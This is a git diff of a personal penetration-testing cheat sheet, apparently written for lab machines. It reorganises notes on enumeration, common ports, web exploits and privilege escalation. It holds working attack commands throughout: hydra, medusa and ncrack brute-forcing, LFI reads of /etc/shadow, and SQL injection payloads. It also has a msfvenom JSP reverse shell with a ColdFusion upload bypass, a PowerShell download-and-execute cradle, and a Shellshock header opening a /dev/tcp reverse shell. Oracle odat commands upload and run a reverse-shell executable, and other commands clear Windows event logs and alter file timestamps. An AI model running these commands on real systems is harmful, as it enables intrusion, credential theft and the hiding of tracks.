@@ -1,160 +1,177 @@
-Contents
-   0. Penetration Patterns   
-   1.0 Enumeration tools
-   2.0 Linux OS
-   3.0 Windows OS   
-   4.0 Ports information
-   5.0 Web exploits
-   6.0 update is needed. 
+1.	Penetration Patterns	2
+2.	My flow	2
+3.	Enumeration tools	5
+4.	Linux OS	6
+5.	Windows OS	7
+6.	Ports information	8
+7.	Web exploits	15
+8.	Post-Exploitation && Privilege escalation	20
+8.1.	Linux	20
+8.1.1.	SUID/SGID	20
+8.1.2.	sudo	21
+8.1.3.	capability	21
+8.1.4.	cron	21
+8.1.5.	Writable folder	22
+8.1.6.	Dot in path	22
+8.1.7.	Vulnerable software and services	22
+8.1.8.	Logs/stuff	23
+8.1.9.	Manual	25
+8.1.10.	Auto tools	27
+8.1.11.	Restricted Shell escape	27
+8.1.12.	nc interactive shell        #use without rlwrap	28
+8.2.	Windows	28
+8.2.1.	UAC Bypass	35
+8.2.2.	Passing another user's creds	38
+8.2.3.	Saving Creds	38
+8.2.4.	Juicy Potato   - Golden privilege	38
+9.	Tunneling	41
+10.	RE stuff	42
+11.	Extra info	43
 
-0. Penetration Patterns
-   1. Reconnaissance    # Identifing IP address, ports, services running
-   2. Info gathering    # How much do i know regarding services which are running on the targer?
+ 
+
+1.	Penetration Patterns
+   1. Reconnaissance    # Identifying IP address, ports, services running
+   2. Info gathering    # How much do I know regarding services which are running on the target?
    3. Vulnerability Research    #explore identified services and the use of the target system
-   4. Exploit                   # get low privilige shell
-   5. Post-Exploit&&Privilege Escalation  # owned the target
-      search for other users, creds, network surface, processes, kernal version, 
+   4. Exploit                   # get low privilege shell
+   5. Post-Exploit&&Privilege Escalation # owned the target
+      search for other users, creds, network surface, processes, kernel version,
       
-0.1 My flow
+2.	My flow
 Tmux screen 1: ./nmapAutomator <ip> All
 Tmux screen 2: nmap -sC -sV -sT -p- <ip>
 
-web
+Web
 gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 30
 
-linux
-	cd ~
-	which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
-	cat /etc/passwd
-	sudo -l
-	su -
-	find / -perm /4000 -ls 2>/dev/null        
-	find / -perm /2000 -ls 2>/dev/null
-	find . -ls -type -f
-	id
-	ps aux
-	ps -elf
-	ps -eo user,command,pid
-	automated tools
-windows
-       Hidden 
-	scheduled tasks (schtasks, strat from top)
-		  schtasks /query /fo LIST /v
-                  schtasks /query /fo LIST /v | Select-String -Pattern "SYSTEM" -CaseSensitive -Context 5,0 | Select-String -Pattern "Task to Run"
+Linux
+cd ~
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+cat /etc/passwd
+sudo -l
+su -
+find / -perm /4000 -ls 2>/dev/null        
+find / -perm /2000 -ls 2>/dev/null
+find . -ls -type -f
+id
+ps aux
+ps -elf
+ps -eo user,command,pid
+automated tools
+
+Windows
+Hidden 
+scheduled tasks (schtasks, strat from top)
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | Select-String -Pattern "SYSTEM" -CaseSensitive -Context 5,0 | Select-String -Pattern "Task to Run"
 	process (tasklist /v)
-		  tasklist /SVC
-                  tasklist /v
-                  tasklist /svc |find /i "pid"
-	services(wmic, sc qc, services with no description)
-	          get-service
-                     get-service |where {$_.status -eq running}
-                  for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
-                     services.msc --> search for items without description.
-                  reg query HKLM\system\currentcontrolset\services\ /s /v imagerpath |select-string -pattern "imagepath" -casesensitive |select-string -pattern "system32" -notmatch                
-                  sc qc <service>     #get more information about service
-                  sc qc 
+tasklist /SVC
+tasklist /v
+tasklist /svc |find /i "pid"
+	services (wmic, sc qc, services with no description)
+get-service
+get-service |where {$_.status -eq running}
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
+services.msc --> search for items without description.
+reg query HKLM\system\currentcontrolset\services\ /s /v imagerpath |select-string -pattern "imagepath" -casesensitive |select-string -pattern "system32" -notmatch                
+ sc qc <service>     #get more information about service
+
 	registry (RUN/RUN ONCE)
-                  run keys, Run once keys 
-	                reg query HKLM\software\microsoft\windows\currentversion\run 
-        	        reg query HKCU\software\microsoft\windows\currentversion\run 
+                  Run keys, Run once keys 
+reg query HKLM\software\microsoft\windows\currentversion\run 
+reg query HKCU\software\microsoft\windows\currentversion\run 
                   Run Once keys  # run once and remove itself.  
-                  	reg query HKLM\software\microsoft\windows\currentversion\runOnce 
-                        reg query HKCU\software\microsoft\windows\currentversion\runOnce 
+reg query HKLM\software\microsoft\windows\currentversion\runOnce 
+reg query HKCU\software\microsoft\windows\currentversion\runOnce 
                   service = process runs on background. svchost.  
-                        reg query HKLM\system\currentcontrolset\services 
-                        reg query HKLM\software\microsoft\windows NT\currentversion\winlogon 
-                        reg query HKLM\software\microsoft\windows\currentversion\explore\shell folders 
-                        reg query HKLM\software\microsoft\windows\currentversion\explore\user shell folders 
-	auditpol(Be admin)
-	             auditpol /get/category:*
-                     auditpol /get /category:* |findstr /i "success failure"
-                     auditpol /list /subcategory:"detailed Tracking","DS Access"
-	                   Event log
-                      storatge
-                        C:\windows\system32\config\filetype.evtx/.evt
-                      webtutile el
-                      wmic ntevent where "logfile="<LOGNAME>" list full
-                      Get-Eventlog -List
-                   Determine PS version (bunch of ways)
-                      reg query hklm\software\microsoft\powershell\3\powershellengine\
-                      powershell -command "$psversiontable
-                   Determine if logging is set (PowerShell and WMIC)
-                     reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
-                     reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
-                     # 0 = no | 1 = errors | 2 = verbose
+reg query HKLM\system\currentcontrolset\services 
+reg query HKLM\software\microsoft\windows NT\currentversion\winlogon 
+reg query HKLM\software\microsoft\windows\currentversion\explore\shell folders 
+reg query HKLM\software\microsoft\windows\currentversion\explore\user shell folders 
+	Auditpol(Be admin)
+auditpol /get/category:*
+auditpol /get /category:* |findstr /i "success failure"
+auditpol /list /subcategory:"detailed Tracking","DS Access"
+Event log
+storage
+C:\windows\system32\config\filetype.evtx/.evt
+webtutile el
+wmic ntevent where "logfile="<LOGNAME>" list full
+Get-Eventlog -List
+Determine PS version (bunch of ways)
+reg query hklm\software\microsoft\powershell\3\powershellengine\
+powershell -command "$psversiontable
+Determine if logging is set (PowerShell and WMIC)
+reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
+reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+# 0 = no | 1 = errors | 2 = verbose
 
-                   WMIC Log Storage:
-                     %systemroot%\system32\wbem\Logs\``               
+WMIC Log Storage:
+%systemroot%\system32\wbem\Logs\``               
                    
-                   Find Files and Alter File attributes:
-                        forfiles /P c:\windows\system32 /S /D +05/14/2019
-                        wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
-                        copy /b filename.ext +,,
-                        $(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
-                   Clear Event Logs:
-                        wevtutil clear-log Application
-                        Clear-Eventlog -Log Application, System
-                    Check event viewer
-                        open event viewer
-                              go to filter current log --> xml to see the format
-                        wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
-                           Microsoft Event IDs (Some Important Ones)
-                               4624/4625 successful/failed login
-                               4720 account created
-                               4672 administrator equivalent user logs on
-                               7045 Service creation
-                         wmic neteventlog get name
+ Find Files and Alter File attributes:
+forfiles /P c:\windows\system32 /S /D +05/14/2019
+wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
+copy /b filename.ext +,,
+$(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
+Clear Event Logs:
+wevtutil clear-log Application
+Clear-Eventlog -Log Application, System
+Check event viewer
+open event viewer
+go to filter current log --> xml to see the format
+wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
+Microsoft Event IDs (Some Important Ones)
+4624/4625 successful/failed login
+4720 account created
+4672 administrator equivalent user logs on
+7045 Service creation
+wmic neteventlog get name
                          
-
-
-1.0 Enumeration tools
-    1.1  Nmap: 
-        'nmap -sC -sV -oN nmap.txt <ip> -p-'
-        locate 
-        grep -r categories /usr/share/nmap/scripts/*.nse |grep -oP '".*?"' |sort -u
-        locate <keywords> |grep .nse$      #search for nmap script
-    1.2  nmapAutomator  
-        './nmapAutomator full ip'
-        https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
+3.	Enumeration tools
+3.1.	Nmap: 
+nmap -sC -sV -oN nmap.txt <ip> -p-
+locate 
+grep -r categories /usr/share/nmap/scripts/*.nse |grep -oP '".*?"' |sort -u
+locate <keywords> |grep .nse$      #search for nmap script
                 To user nmap scripts
                git clone https://github.com/vulnersCom/nmap-vulners.git
                cp *.nse /usr/share/nmap/scripts
                nmap --script-updatedb
-    1.3 AutoRecon — https://github.com/Tib3rius/AutoRecon
-    1.4 gobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k 
-        gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 30
-    	gobuster with proxy
-	   Burpsuite: proxy--> options --> proxy listener --> add
-	   	Binding - Bind to port: < desired port >
-		Request handling - Redirect to host/ Redirect to port <target ip/port>
-		firefox : localhost:<desired port>
-		
-    
-    
+
+3.2.	 nmapAutomator  
+        './nmapAutomator full ip'
+        https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
+3.3.	AutoRecon — https://github.com/Tib3rius/AutoRecon
                
-2.0 Linux OS
-	Look for example
-	    curl cht.sh/<command>
-	vi/vim trick
-		:s/foo/bar/g 	Change each 'foo' to 'bar' in the current line.
-		:%s/foo/bar/g 	Change each 'foo' to 'bar' in all the lines.
-		:5,12s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from line 5 to line 12 (inclusive).
-		:'a,'bs/foo/bar/g 	Change each 'foo' to 'bar' for all lines from mark a to mark b inclusive (see Note below).
-		:'<,'>s/foo/bar/g 	When compiled with +visual, change each 'foo' to 'bar' for all lines within a visual selection. Vim automatically appends the visual selection range ('<,'>) for any ex command when you select an area and enter :. Also, see Note below.
-		:.,$s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from the current line (.) to the last line ($) inclusive.
-		:.,+2s/foo/bar/g 	Change each 'foo' to 'bar' for the current line (.) and the two next lines (+2).
-		:g/^baz/s/foo/bar/g 	Change each 'foo' to 'bar' in each line starting with 'baz'. 
-         search for a string
+4.	 Linux OS
+Look for example
+curl cht.sh/<command>
+vi/vim trick
+:s/foo/bar/g 	Change each 'foo' to 'bar' in the current line.
+:%s/foo/bar/g 	Change each 'foo' to 'bar' in all the lines.
+:5,12s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from line 5 to line 12 (inclusive).
+:'a,'bs/foo/bar/g 	Change each 'foo' to 'bar' for all lines from mark a to mark b inclusive (see Note below).
+:'<,'>s/foo/bar/g 	When compiled with +visual, change each 'foo' to 'bar' for all lines within a visual selection. Vim automatically appends the visual selection range ('<,'>) for any ex command when you select an area and enter :. Also, see Note below.
+:.,$s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from the current line (.) to the last line ($) inclusive.
+	:.,+2s/foo/bar/g 	Change each 'foo' to 'bar' for the current line (.) and the two next lines (+2).
+:g/^baz/s/foo/bar/g 	Change each 'foo' to 'bar' in each line starting with 'baz'. 
+search for a string
 	 	grep -rnw '/path/to/somewhere/' -e 'pattern'
 		grep -Ri password .
-
-	 unzip with encryption
+unzip with encryption
 	 	fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace
-
-		
+File transfer tools
+Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket
+host:     impacket-smbserver pkong .      
+target:  
+net use \\<IP>\pkong
+copy \\<IP>\pkong\file .
+	
       
 
-3.0 Windows OS
+5.	Windows OS
    reg
       run keys, Run once keys 
          HKLM:\software\microsoft\windows\currentversion\run 
@@ -168,104 +185,126 @@ windows
          HKLM:\software\microsoft\windows\currentversion\explore\shell folders 
          HKLM:\software\microsoft\windows\currentversion\explore\user shell folders 
     
-4.0 Ports information
-        Unknown ports
+https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+
+Windows x86 Machine powershell location
+    C:\Windows\System32\WindowsPowerShell\v1.0
+    C:\Windows\SysWOW64\WindowsPowerShell\v1.0
+    
+Windows x64 Machine Powershell location
+To launch a 64-bit version of PowerShell:
+    From a 32-bit process, use path:
+    c:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
+
+    From a 64-bit process, use path:
+    c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+
+
+Powershell command
+    Download file 
+    Invoke-WebRequest URL -OutFile c:\file.ext
+    
+
+6.	Ports information
+6.1.	Unknown ports
           amap -d <ip> <port>
           or
           http://www.0daysecurity.com/penetration-testing/enumeration.html
-        Common ports
-            21 FTP
+6.2.	Common ports
+
+21 FTP
                 ftp <ip>
                 nc <ip> <port>
                 anonymous:anoymous
                 binary and ascii mode?
-            22 SSH
-                nc <ip> <port>  --> search for protocol http://www.openssh.com/txt/rfc4253.txt 
-                ssh ip
-		ssh -i <private key> id@<ip_address>
-                ref: https://weberblog.net/ssh-key-fingerprints/ 
-                     https://unix.stackexchange.com/questions/247612/ssh-keeps-skipping-my-pubkey-and-asking-for-a-password/247614 
-                     https://superuser.com/questions/929566/sha256-ssh-fingerprint-given-by-the-client-but-only-md5-fingerprint-known-for-se 
-                     Older openssh/openssl protocols: https://github.com/g0tmi1k/debian-ssh
+
+22 SSH
+nc <ip> <port>  --> search for protocol http://www.openssh.com/txt/rfc4253.txt 
+ssh ip
+ssh -i <private key> id@<ip_address>
+
+ref: https://weberblog.net/ssh-key-fingerprints/ 
+https://unix.stackexchange.com/questions/247612/ssh-keeps-skipping-my-pubkey-and-asking-for-a-password/247614 
+https://superuser.com/questions/929566/sha256-ssh-fingerprint-given-by-the-client-but-only-md5-fingerprint-known-for-se 
+Older openssh/openssl protocols: https://github.com/g0tmi1k/debian-ssh
                      
-            23 Telnet
-                hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
-                patator
+23 Telnet
+hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
+patator
                                                
-            25 SMTP   #send mails
-                Server to Server service.  Users receives/sends emails suing IMAP or POP3. 
-                Then routed to the SMTP server to communicate to another server. Has database. 
-                Cannot retrieve any emails, only can send email. 
-                    http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/          
-                After identify username,
-                  https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
-		smtp-user-enum
+25 SMTP   #send mails
+Server to Server service.  Users receives/sends emails suing IMAP or POP3. 
+Then routed to the SMTP server to communicate to another server. Has database. 
+Cannot retrieve any emails, only can send email. 
+http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/          
+After identify username,
+https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
+smtp-user-enum
 		
-            53 -DNS
-               nslookup - server <ip>
-               nslookup <ip>
-               DNS zone transfer -TCP
-                   dig axfr  @ip_address dns_name 
-                   update /etc/hosts 
-                
-               
-               
-            69 - TFTP
-                ftp-server
-                UDP
-		
-	    79- Solaris finger
-	    	https://github.com/pentestmonkey/finger-user-enum.git
-			https://github.com/pentestmonkey/finger-user-enum.git
+53 -DNS
+nslookup - server <ip>
+nslookup <ip>
+DNS zone transfer -TCP
+dig axfr  @ip_address dns_name 
+update /etc/hosts 
+
+69 - TFTP
+ftp-server
+UDP
+
+79- Solaris finger
+https://github.com/pentestmonkey/finger-user-enum.git
+https://github.com/pentestmonkey/finger-user-enum.git
 			
-            80- HTTP
-                .htaccess can password protect certain directories. 
-                    Create a directory which will be password-protected. 
-                    Create .htaccess tile inside that directroy. Contents are as follows,
-                        AuthType Basic
-                        AuthType Basic
-                        AuthName "Password Protected Area"
-                        AuthUserFile /var/www/html/test/.htpasswd
-                        Require valid-user  
-                    Create .htpasswd file. Contents are as follows,
-                        htpasswd -cb .htpasswd test admin
-                        service apache2 restart
-                    If the directory does not display a login-prompt, change the apache2.conf as follows,
-                        <Directory /var/www/html/test>
-                            AllowOverride AuthConfig
-                        </Directory>
-                    Then, Bruceforce
-                        medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
-                  curl -i -X OPTIONS <ip>
-                  curl -X PUT http://10.10.10.15/pkong.txt -d@test.txt # putting Pkong.txt with the data of test.txt
+80- HTTP
+.htaccess can password protect certain directories. 
+Create a directory which will be password-protected. 
+Create .htaccess tile inside that directroy. Contents are as follows,
+AuthType Basic
+AuthType Basic
+AuthName "Password Protected Area"
+AuthUserFile /var/www/html/test/.htpasswd
+Require valid-user  
+Create .htpasswd file. Contents are as follows,
+htpasswd -cb .htpasswd test admin
+service apache2 restart
+If the directory does not display a login-prompt, change the apache2.conf as follows,
+<Directory /var/www/html/test>
+AllowOverride AuthConfig
+</Directory>
+Then, Bruceforce
+medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
+curl -i -X OPTIONS <ip>
+curl -X PUT http://10.10.10.15/pkong.txt -d@test.txt # putting Pkong.txt with the data of test.txt
 		  
 
-            88- Kerberos
-                Network Authentication protocol. 
-                Common for Windows Domain controller.
-                MS14-068
-                https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+88- Kerberos
+Network Authentication protocol. 
+Common for Windows Domain controller.
+MS14-068
+https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
                 
-            110 Pop3   #read emails
+110 Pop3   #read emails
                 telnet <ip> 110
                 USER pkong@<ip>
                 PASS admin
                 list   #List all emails
                 retr 5  #Retrieve email number 5. 
-            111 Rpcbind
+111 Rpcbind
                 RFC 1833
                 Can be used to look for NFS-shares.
                 rpcbind -p <ip>
                 rpcinfo <IP>
                 
-            119 NNTP
+119 NNTP
                 Network time protocol, Synchronize time. 
                 nc -nvC <ip> 119    # banner grabbing
                     
-            135 MSRCP
+135 MSRCP
                 nmap <ip> --script=msrpc-enum
-                    https://en.wikipedia.org/wiki/Microsoft_RPC    --> Windows rpc port
-            139/ 445 SMB SAMBA
+                https://en.wikipedia.org/wiki/Microsoft_RPC    --> Windows rpc port
+139/ 445 SMB SAMBA
 	    https://book.hacktricks.xyz/pentesting/pentesting-smb
 	    smbmap -H <IP>
 	    
@@ -296,14 +335,9 @@ windows
                 https://github.com/worawit/MS17-010.git     #without named pipe
                 https://github.com/mez-0/MS17-010-Python
                 
-                
-                
-                
-                
-                
-            143/993 IMAP
+143/993 IMAP
                 Access email stored on that server from various devices. 
-            161-162 SNMP
+161-162 SNMP
                 Simple Network Managment Protocol
                 SNMP 1,2, and 2c clear text traffic. Credentials can be stolen.
                 Used to manage devices ona network. 
@@ -319,46 +353,50 @@ windows
                 snmp-check -t <ip> -c public
                 nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
 
-            199 - Smux
-            389/636 LDAP
+199 - Smux
+389/636 LDAP
                 Lightweight Directory Access Protocol   (More likely telephone-directory)
                 Database tree
                 Often in corporate structure, store user information, used for authentication(web application)
                 ldapsearch -h <ip> -p 389 -x -b "dc=mywebsite,dc=com"
        
-            
-            443- HTTPS
+443- HTTPS
                 OpenSSL 1.0.1-1.0.1f Vulnerable
                 OpenSSL 1.0.1g, 1.0.0, 0.9.8 NOT vulnerable 
                 headrbleed? https://heartbleed.com/
                 sudo sslscan <IP>:443
                 nmap -sV --script=ssl-heartbleed <ip>
                 Certificate?
-            514 UDP:syslog TCP:rsyslog
+514 UDP:syslog TCP:rsyslog
                 Remote syslogin. 
                 grep "IncludeConfig" /etc/rsyslog.conf
                   
-            554-RTSP : Real Time Streaming Protocol
+554-RTSP : Real Time Streaming Protocol
                 Statful (TCP)
                 IP-cameras, with potential GUI
-            587 Submission
+            
+587 Submission
                 OUtgoing smtp-port
                 If postfix is run, could be shellshock
-            631 Cups - Common UNIX Printing System
+
+631 Cups - Common UNIX Printing System
                 netstat
                 log in: http://localhost:631/admin
-                            993 IMAP encrypted
-            995 POP3 Encryption
+
+993 IMAP encrypted
+995 POP3 Encryption
                 110 is POP3 non-encrypted
                 25, 465
-            1025 - NSF or IIS
+
+1025 - NSF or IIS
             1030/1032/1033/1038
-                Used by the RPC within Windows Domain.
-            1433 MsSql
+            Used by the RPC within Windows Domain.
+
+1433 MsSql
                 sqsh -S <ip> -U sa
-                    xp_cmdshell 'date'
-                    go                   
-            1521 Oracle database
+                 xp_cmdshell 'date'
+                 go                   
+1521 Oracle database
                 Enumeration
                     tnscmd10g version -h <ip>
                     tnscmd10g status -h <ip>
@@ -366,51 +404,52 @@ windows
                   https://github.com/quentinhardy/odat 
                   https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
                   Put the file 
-                     python3 odat.py utlfile -s 10.10.10.82 --sysdba -U scott -P tiger -d XE --putFile /temp thanks.exe ./reverse_3333.exe 
+                  	python3 odat.py utlfile -s 10.10.10.82 --sysdba -U scott -P tiger -d XE --putFile /temp thanks.exe ./reverse_3333.exe 
                   Execute the file 
-                     python3 odat.py externaltable -s 10.10.10.82  -U scott -P tiger -d XE --sysdba --exec /temp thanks.exe  
+                  	python3 odat.py externaltable -s 10.10.10.82  -U scott -P tiger -d XE --sysdba --exec /temp thanks.exe  
             1748,1754,1808,1809 Oracle
                 Orcales Intelligent Agent
              
-            2049 -NFS
+2049 -NFS
                 showmount -e <ip>
                 mount <ip>:/tmp/<location>
                 
-            3389 Remote Desktop
+3389 Remote Desktop
                  rdesktop -u guest -p guest 10.11.1.5 -g 94%    
                  Brute Force 
                      ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
-            4555 James Remote Server
-                default userid:password
-                    root:root
-	    5353 zeroconf
-	    	nmap -Pn -sUC -p5353 ip
-  	    5901 VNCviewer
-	    	https://github.com/jeroennijhof/vncpwd
+4555 James Remote Server
+default userid:password
+root:root
+5353 zeroconf
+nmap -Pn -sUC -p5353 ip
+5901 VNCviewer
+https://github.com/jeroennijhof/vncpwd
 		
-                    
-            
-        
-      
 
-
-5.0 Web exploits
+7.	Web exploits
       Develop a webpage map
       	10.10.10.10
 		10.10.10.10/index
 			10.10.10.10/index/index.html
 		10.10.10.10/robots.txt
-      Wordpress
+7.1.	Enum
+gobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k 
+gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 30
+    	gobuster with proxy
+	   Burpsuite: proxy--> options --> proxy listener --> add
+	   	Binding - Bind to port: < desired port >
+		Request handling - Redirect to host/ Redirect to port <target ip/port>
+		firefox : localhost:<desired port>
+Wordpress
       	wpsscan
 		wpscan --url http://10.10.10.88/webservices/wp/ -e ap --plugins-detection aggressive
 	vane
 		 ruby ./vane.rb --url http://10.10.10.88/webservices/wp --enumerate p
-
-	
-      Bruteforce
+Bruteforce
       	patator
 	hydra
-		hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
 		 -l : login
 		 -P : password with file
 		ip address
@@ -421,35 +460,28 @@ windows
 		hydra -l admin -P pw 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
 		
 
-		
-		
-	
-
-	
-      LFIs
+7.2.	LFIs
         https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
          Linux 
              'LFI - php?list=../../../../../../../../../../etc/shadow'
 	 php wrapper
 	 	.php?file=php://filter/convert.base64-encode/resource=../../../../../../../../../../../etc/passwd
-         Windows
-             'LFI -php?list=../../../../../../../../../../<>>>>'
 	     
-      SQL Injection     #Examine how the server behaves
-            ' or '1'='1
-            ' or 1=1-- -
-            ' or 1=1 --	    
-            a' or 1=1 --	
-	         " or 1=1 --	  
-	         a" or 1=1 --	      
-           ' or 1=1 #	      
-           " or 1=1 #	     
-           or 1=1 --	      
-           ' or 'x'='x	  
-           " or "x"="x	  
-           ') or ('x'='x	
-           ") or ("x"="x	      
-           ' or username LIKE '%admin% 
+7.3.	      SQL Injection     #Examine how the server behaves
+' or '1'='1
+' or 1=1-- -
+' or 1=1 --	    
+a' or 1=1 --	
+" or 1=1 --	  
+a" or 1=1 --	      
+' or 1=1 #	      
+" or 1=1 #	     
+or 1=1 --	      
+‘ or 'x'='x	  
+" or "x"="x	  
+') or ('x'='x	
+") or ("x"="x	      
+' or username LIKE '%admin% 
 
          https://www.exploit-db.com/papers/12975
          https://dev.mysql.com/doc/refman/8.0/en/select.html
@@ -462,18 +494,18 @@ windows
          https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell
          https://portswigger.net/web-security/sql-injection/union-attacks
 
-      Drupal 7.54
+Drupal 7.54
          Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code  php/webapps/44449.rb 
          powershell "IEX(new-object net.webclient).downloadstring('nishang_shell')" 
 
-      Microsoft iis version
-            1.0	Included with Windows NT 3.51 SP 3 (or as a self-contained download). 	Windows NT Server 3.51
-            2.0	Included with Windows NT Server 4.0.	Windows NT Server 4.0
-            3.0	Included with Windows NT Server 4.0 Service Pack 3 (Internet Information Server 2.0 is automatically upgraded to Internet Information Server 3.0 during the install of SP3).	Windows NT Server 4.0
-            4.0	Self-contained download from www.microsoft.com or the Windows NT Option Pack compact disc.	Windows NT Server 4.0 SP3 and Microsoft Internet Explorer 4.01
-            5.0	Built-in component of Windows 2000. 	Windows 2000
-            5.1	Built-in component of Windows XP Professional.	Windows XP Professional
-            6.0	Built-in component of Windows Server 2003.	WIndows Server 2003
+Microsoft IIs version
+1.0	Included with Windows NT 3.51 SP 3 (or as a self-contained download). 	Windows NT Server 3.51
+2.0	Included with Windows NT Server 4.0.	Windows NT Server 4.0
+3.0	Included with Windows NT Server 4.0 Service Pack 3 (Internet Information Server 2.0 is automatically upgraded to Internet Information Server 3.0 during the install of SP3).	Windows NT Server 4.0
+4.0	Self-contained download from www.microsoft.com or the Windows NT Option Pack compact disc.	Windows NT Server 4.0 SP3 and Microsoft Internet Explorer 4.01
+5.0	Built-in component of Windows 2000. 	Windows 2000
+5.1	Built-in component of Windows XP Professional.	Windows XP Professional
+6.0	Built-in component of Windows Server 2003.	WIndows Server 2003
                CVE-2017-7269
                   https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
                webdav
@@ -481,18 +513,17 @@ windows
                   /usr/share/nmap/scripts/http-iis-webdav-vuln.nse                                                                                                                       
                   /usr/share/nmap/scripts/http-webdav-scan.nse
                   PUT/MOVE Options are on = File upload is possible. 
-            7.0	Built-in component of Windows Vista and Windows Server 2008.	Windows Vista and WIndows Server 2008
-            7.5	Built-in component of Windows 7 and Windows Server 2008 R2.	Windows 7 and Windows Server 2008 R2
-                  
-                  
+7.0	Built-in component of Windows Vista and Windows Server 2008.	Windows Vista and WIndows Server 2008
+7.5	Built-in component of Windows 7 and Windows Server 2008 R2.	Windows 7 and Windows Server 2008 R2
                   https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
-                  
-            8.0	Built-in component of Windows 8 and Windows Server 2012.	Windows 8 and Windows Server 2012
-      Cold fusion8
+8.0	Built-in component of Windows 8 and Windows Server 2012.	Windows 8 and Windows Server 2012
+
+     
+ Cold fusion8
          Uses JSF
          msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
          Make a curl request from 16788.rb 
-             curl -X POST -F "newfile=@shell.jsp; type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/pkong.jsp%00'
+curl -X POST -F "newfile=@shell.jsp; type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/pkong.jsp%00'
          Adobe ColdFusion – Directory Traversal multiple/remote/14641.py 
             Gain initial creds
             Then upload shell from the website
@@ -520,7 +551,7 @@ windows
                      () { :; };  echo $(</etc/passwd) 
                      () { :; }; /bin/echo hello 
                      If not then, cat $PATH from the host machine. 
-                       User-Agent:  () { :; };  echo;export PATH=/root/Download/jdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; bash -i >& /dev/tcp/192.168.119.131/8081 0>&1; 
+User-Agent:  () { :; };  echo;export PATH=/root/Download/jdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; bash -i >& /dev/tcp/192.168.119.131/8081 0>&1; 
       Tools
